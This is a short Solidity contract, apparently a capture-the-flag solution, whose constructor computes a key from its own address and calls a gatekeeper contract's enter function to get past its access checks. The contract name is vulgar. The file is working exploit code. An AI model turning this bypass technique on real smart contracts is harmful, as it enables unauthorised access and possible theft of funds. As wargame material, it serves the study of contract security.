// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateFucker {
  constructor(address gatekeeper) {
    (bool success, bytes memory returnedBytes) = address(gatekeeper).call(
      abi.encodeWithSignature("enter(bytes8)", 
      ~bytes8(keccak256(abi.encodePacked(address(this)))))
    );
    require(success, "A1");
    require(abi.decode(returnedBytes, (bool)) == true, "A2");
  }
}
